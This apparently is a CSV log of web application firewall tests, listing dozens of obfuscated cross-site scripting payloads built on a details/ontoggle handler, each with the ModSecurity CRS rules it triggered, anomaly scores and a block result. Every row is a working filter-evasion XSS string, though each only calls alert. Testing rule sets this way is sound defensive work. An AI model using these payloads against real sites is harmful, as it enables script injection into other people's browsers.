index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
216,"<details open ontoggle=""(function(){var p=String.fromCharCode(97,108)+String.fromCharCode(101,114,116);window[p](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o109,11v217,123t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,123 || o25,11v217,123t:urlDecodeUni || v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o103,9v217,123t:urlDecodeUni,t:compressWhitespace || ",30,177826414778.376887
217,"<details open ontoggle=""(function(){var q='al'+'ert';(1,window[q])(1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o62,12v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,9v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826414948.218821
218,"<details open ontoggle=""(function(){var r='al'+'ert';(window)[r](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o53,19v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,75 || o25,11v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o54,10v217,75t:urlDecodeUni,t:compressWhitespace || ",30,177826415168.412912
219,"<details open ontoggle=""(function(){var s='ale'+'rt';(0,window[s])(1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o62,12v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,9v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826415317.467256
220,"<details open ontoggle=""(function(){var u='al'+'\x65'+'rt';window[u](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o65,11v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,79t:urlDecodeUni,t:compressWhitespace || ",30,177826415533.411002
221,"<details open ontoggle=""(function(){var v='al'+'ert';self[''+v](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o57,14v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,74 || o25,11v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,10v217,74t:urlDecodeUni,t:compressWhitespace || ",30,177826415718.484174
222,"<details open ontoggle=""(function(){var a='al';var b='ert';this[a+b](1)})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o63,12v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826415910.262218
225,"<details open ontoggle=""(function(){top['al'+'ert'](1)})()"">",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o33,6v217,60 || o24,34v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,60 || o25,11v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,15v217,60t:urlDecodeUni,t:compressWhitespace || ",35,177826416540.773789
228,"<details open ontoggle=""(function(){this['al\u0065rt'](1)})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,18v217,63t:urlDecodeUni,t:compressWhitespace || ",20,177826417126.889259
230,"<details open ontoggle=""(function(){parent['a'+'l'+'e'+'r'+'t'](1)})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,46v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,72 || o25,11v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782641753.299222
242,"<details open ontoggle=""(function(){var a=[97,108,101,114,116].map(x=>String.fromCharCode(x)).join('');window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o109,11v217,122t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,122 || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o103,9v217,122t:urlDecodeUni,t:compressWhitespace || ",25,177826419940.145090
243,"<details open ontoggle=""(function(){var a=atob('YWxlcnQ=');window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o65,11v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,78t:urlDecodeUni,t:compressWhitespace || ",25,177826420191.839200
244,"<details open ontoggle=""(function(){var a='al'+'er'+'t';window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o62,11v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,75 || o25,11v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,9v217,75t:urlDecodeUni,t:compressWhitespace || ",30,177826420444.014702
246,"<details open ontoggle=""(function(){var a=unescape('%61%6c%65%72%74');window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o66,11v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,89 || o25,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o60,9v217,89t:urlDecodeUni,t:compressWhitespace || ",30,177826420850.246392
247,"<details open ontoggle=""(function(){var a=decodeURIComponent('%61%6c%65%72%74');window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o76,11v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || o25,11v217,99t:urlDecodeUni || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o70,9v217,99t:urlDecodeUni,t:compressWhitespace || ",30,177826421066.315472
249,"<details open ontoggle=""(function(){var a='\u0061\u006c\u0065\u0072\u0074';window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o81,11v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o75,9v217,94t:urlDecodeUni,t:compressWhitespace || ",25,177826421469.858386
250,"<details open ontoggle=""(function(){var a=String.fromCodePoint(97,108,101,114,116);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o89,11v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o83,9v217,102t:urlDecodeUni,t:compressWhitespace || ",25,177826421656.359100
251,"<details open ontoggle=""(function(){var b=top,a=String.fromCharCode(97,108,101,114,116);b[a](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o89,11v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826421996.133657
252,"<details open ontoggle=""(function(){var b=self,a=String.fromCharCode(97,108,101,114,116);b[a](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o90,11v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826422144.606815
253,"<details open ontoggle=""(function(){var a=String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116);window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o172,11v217,185t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,185 || o25,11v217,185t:urlDecodeUni || v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o166,9v217,185t:urlDecodeUni,t:compressWhitespace || ",30,177826422326.421633
254,"<details open ontoggle=""(function(){with(window)this[String.fromCharCode(97,108,101,114,116)](1);})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,52v217,103t:urlDecodeUni,t:compressWhitespace || ",20,177826422581.773105
255,"<details open ontoggle=""(function(){var a=String['fromCharCode'](97,108,101,114,116);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,54v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,104t:urlDecodeUni,t:compressWhitespace || ",25,177826422738.711361
256,"<details open ontoggle=""(function(){var c={};c.a=String.fromCharCode(97,108,101,114,116);window[c.a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o95,13v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o89,11v217,110t:urlDecodeUni,t:compressWhitespace || ",25,17782642293.180337
257,"<details open ontoggle=""(function(){var a=[String.fromCharCode(97),String.fromCharCode(108),String.fromCharCode(101),String.fromCharCode(114),String.fromCharCode(116)].join('');window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o183,11v217,196t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,196 || v217,196t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,196t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o177,9v217,196t:urlDecodeUni,t:compressWhitespace || ",25,177826423178.771024
258,"<details open ontoggle=""(function(){var obj={m:String.fromCharCode(97,108,101,114,116)};window[obj.m](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,15v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,13v217,111t:urlDecodeUni,t:compressWhitespace || ",25,177826423328.461726
260,"<details open ontoggle=""(function(){var chars=[97,108,101,114,116];var a=chars.reduce((s,c)=>s+String.fromCharCode(c),'');window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o128,11v217,141t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,141 || o25,11v217,141t:urlDecodeUni || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o122,9v217,141t:urlDecodeUni,t:compressWhitespace || ",30,177826423753.158771
261,"<details open ontoggle=""(function(){var a=(function(){return String.fromCharCode(97,108,101,114,116);})();window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o112,11v217,125t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,125 || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o106,9v217,125t:urlDecodeUni,t:compressWhitespace || ",25,177826423961.952255
262,"<details open ontoggle=""(function(){var b=String.fromCodePoint(97,108,101,114,116);window[b]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o89,14v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o83,9v217,105t:urlDecodeUni,t:compressWhitespace || ",25,177826424128.355795
263,"<details open ontoggle=""(function(){var c=atob('YWxlcnQ=');window[c]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o65,14v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,81t:urlDecodeUni,t:compressWhitespace || ",25,177826424368.484509
265,"<details open ontoggle=""(function(){var e='ale'+'rt';window[e]('XSS')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o59,14v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,75 || o25,11v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,9v217,75t:urlDecodeUni,t:compressWhitespace || ",30,177826424732.482642
266,"<details open ontoggle=""(function(){var f=String['from'+'CharCode'](97,108,101,114,116);window[f]('XSS')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,60v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || o25,11v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,110t:urlDecodeUni,t:compressWhitespace || ",30,17782642509.693376
267,"<details open ontoggle=""(function(){var g=unescape('%61%6c%65%72%74');window[g]('XSS')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o66,14v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,92 || o25,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o60,9v217,92t:urlDecodeUni,t:compressWhitespace || ",30,177826425112.302063
268,"<details open ontoggle=""(function(){var h=decodeURI('%61lert');window[h]('XSS')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o67,14v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,85 || o25,11v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,9v217,85t:urlDecodeUni,t:compressWhitespace || ",30,177826425385.025323
270,"<details open ontoggle=""(function(){var j=String[`fromCharCode`](97,108,101,114,116);window[j]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o91,14v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,107t:urlDecodeUni,t:compressWhitespace || ",25,177826425820.169757
275,"<details open ontoggle=""(function(){var q=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[q]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,14v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,110t:urlDecodeUni,t:compressWhitespace || ",25,177826426882.885159
276,"<details open ontoggle=""(function(){var r=[String][0].fromCharCode(97,108,101,114,116);window[r]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o93,14v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o87,9v217,109t:urlDecodeUni,t:compressWhitespace || ",25,177826427027.417188
277,"<details open ontoggle=""(function(){var s=String['fromCh'+'arCode'](97,108,101,114,116);window[s]('XSS')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,60v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || o25,11v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,110t:urlDecodeUni,t:compressWhitespace || ",30,17782642723.292990
279,"<details open ontoggle=""(function(){var u=({}).constructor.constructor('return ale'+'rt')();u(1)})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o42,58v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,102 || o25,11v217,102t:urlDecodeUni || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782642762.506601
